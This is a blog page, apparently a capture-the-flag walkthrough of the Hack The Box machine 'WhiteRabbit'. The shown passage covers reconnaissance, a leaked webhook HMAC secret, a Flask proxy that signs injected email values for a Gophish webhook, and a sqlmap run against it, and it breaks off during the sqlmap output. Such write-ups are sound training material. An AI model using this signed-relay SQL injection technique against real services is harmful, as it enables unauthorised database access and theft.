@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/12/13/hackthebox-whiterabbit/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewWhiteRabbit is an insane-difficulty machine from Hack The Box : Flask proxy endpoint → signed webhook request abuse → SQL injection in webhook backend by relaying it → MySQL database dump → ex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: WhiteRabbit">
+<meta property="og:url" content="http://fouedsaidi.com/2025/12/13/Hackthebox-WhiteRabbit/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewWhiteRabbit is an insane-difficulty machine from Hack The Box : Flask proxy endpoint → signed webhook request abuse → SQL injection in webhook backend by relaying it → MySQL database dump → ex">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/WhiteRabbit/WhiteRabbit.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/WhiteRabbit/web.png">
+<meta property="article:published_time" content="2025-12-13T15:27:16.000Z">
+<meta property="article:modified_time" content="2025-12-13T18:30:42.978Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/WhiteRabbit/WhiteRabbit.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: WhiteRabbit -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: WhiteRabbit</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-12-13 18:27:16</span>
+        <span class="mobile">2025-12-13 18:27:16</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-13 21:30:42</span>
+            <span class="mobile">2025-12-13 21:30:42</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>WhiteRabbit is an insane-difficulty machine from Hack The Box : Flask proxy endpoint → signed webhook request abuse → SQL injection in webhook backend by relaying it → MySQL database dump → extract command_log entries → identify and reverse timestamp-seeded rand() password generator → predict valid password → SSH login as neo → sudo to root</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/WhiteRabbit/WhiteRabbit.png"
+                      alt="WhiteRabbit"
+                ><figcaption>WhiteRabbit</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)</span><br><span class="line">|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)</span><br><span class="line">80/tcp   open  http    Caddy httpd</span><br><span class="line">|_http-server-header: Caddy</span><br><span class="line">|_http-title: Did not follow redirect to http://whiterabbit.htb</span><br><span class="line">2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)</span><br><span class="line">|_  256 ad:42:c0:28:77:<span class="built_in">dd</span>:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 39.01 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have our usual ssh port, a web application deployed on port 80 that’s redirecting us to <code>whiterabbit.htb</code> so we’ll add it to our <code>/etc/hosts</code> file and finally another ssh service deployed on port 2222.</p>
+<h2 id="Web-Application-http-whiterabbit-htb"><a href="#Web-Application-http-whiterabbit-htb" class="headerlink" title="Web Application - http://whiterabbit.htb/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://whiterabbit.htb/" >http://whiterabbit.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><p>Upon inspecting the web application, we can also see a new subdomain <code>http://status.whiterabbit.htb/dashboard</code> so we’ll add it to our <code>/etc/hosts</code> also.</p>
+<p>We will attempt the login by intercepting login request, change <code>false</code> to <code>true</code> to gain access.</p>
+<p>Looking at <a class="link"   target="_blank" rel="noopener" href="http://status.whiterabbit.htb/status/temp" >http://status.whiterabbit.htb/status/temp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, we find some interesting subdomains meant for internal services:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gophish (ddb09a8558c9.whiterabbit.htb)</span><br><span class="line">n8n (Production)</span><br><span class="line">website (whiterabbit.htb)</span><br><span class="line">wikijs (a668910b5514e.whiterabbit.htb)</span><br></pre></td></tr></table></figure></div>
+
+<p>Looking at <a class="link"   target="_blank" rel="noopener" href="http://a668910b5514e.whiterabbit.htb/" >http://a668910b5514e.whiterabbit.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, we find <code>http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks</code></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/WhiteRabbit/web.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.json" >http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.json <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>Inside of the json we find this <code>webhoodId</code> and secret:</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">      <span class="attr">&quot;webhookId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;</span></span><br><span class="line">              <span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We will create a Flask app that is basically a small proxy that takes whatever you pass in the q parameter, treats it as an email, signs it with an HMAC, and forwards it to the Gophish webhook endpoint, then returns the webhook’s response.<br>The forwarded email value is being used unsafely by the webhook’s backend<br>We will abuse this with sqlmap by exploiting the downstream webhook service, which lets us dump the MySQL databases and even recover logged shell commands from the backend &#x3D;&gt; SQL injection through a relay endpoint:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET = <span class="string">&quot;3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS&quot;</span></span><br><span class="line">WEBHOOK_URL = <span class="string">&quot;http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;</span>  <span class="comment"># Change as needed</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_hmac</span>(<span class="params">payload: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    payload_str = json.dumps(payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    signature = hmac.new(SECRET.encode(), payload_str.encode(), hashlib.sha256).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> signature</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    email = request.args.get(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> email:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Missing &#x27;q&#x27; query parameter for email&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">      <span class="string">&quot;campaign_id&quot;</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">      <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Clicked Link&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    signature = calculate_hmac(payload)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;x-gophish-signature&quot;</span>: <span class="string">f&quot;hmac=<span class="subst">&#123;signature&#125;</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(WEBHOOK_URL, headers=headers, json=payload)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Return the response from the endpoint as plain text.</span></span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&#x27;http://127.0.0.1:5000/?q=test&#x27;</span> -p q --level 5 --risk 3 --batch --dbs    </span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.11<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [.]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 12:29:22 /2025-04-07/</span><br><span class="line"></span><br><span class="line">[12:29:22] [INFO] testing connection to the target URL</span><br><span class="line">[12:29:23] [INFO] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">[12:29:23] [INFO] target URL content is stable</span><br><span class="line">[12:29:24] [INFO] heuristic (basic) <span class="built_in">test</span> shows that GET parameter <span class="string">&#x27;q&#x27;</span> might be injectable (possible DBMS: <span class="string">&#x27;MySQL&#x27;</span>)</span><br><span class="line">[12:29:24] [INFO] testing <span class="keyword">for</span> SQL injection on GET parameter <span class="string">&#x27;q&#x27;</span></span><br><span class="line">it looks like the back-end DBMS is <span class="string">&#x27;MySQL&#x27;</span>. Do you want to skip <span class="built_in">test</span> payloads specific <span class="keyword">for</span> other DBMSes? [Y/n] Y</span><br><span class="line">[12:29:24] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[12:29:37] 